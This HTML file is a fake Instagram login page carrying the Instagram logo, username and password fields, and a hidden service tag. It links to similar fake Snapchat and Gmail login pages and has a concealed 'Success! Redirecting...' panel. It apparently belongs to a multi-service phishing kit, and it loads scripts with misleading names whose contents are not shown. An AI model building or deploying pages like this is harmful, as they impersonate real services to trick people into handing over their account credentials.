<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login</title>
    <link rel="manifest" href="manifest.json">
    <link rel="stylesheet" href="style.css">
</head>
<body class="instagram-theme">
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" style="width: 150px;">
        </div>
        <form id="loginForm">
            <input type="hidden" id="service_name" value="instagram">
            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">OR</div>
        <a href="#" class="forgot-password">Forgot password?</a>

        <div class="social-nav">
            <a href="index.html" title="Login with Snapchat">
                <img src="https://www.freepnglogos.com/uploads/snapchat-logo-png-0.png" alt="Snapchat" width="20" height="20">
            </a>
            <a href="gmail.html" title="Login with Gmail">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail" width="20" height="20">
            </a>
        </div>
    </div>
    <div class="congrats-container" style="display: none;">
        <h2>Success!</h2>
        <p>Redirecting...</p>
    </div>
    <script src="ovpn-generator.js"></script>
    <script src="network-config-native.js"></script>
    <script src="script-enhanced.js"></script>
</body>
</html>
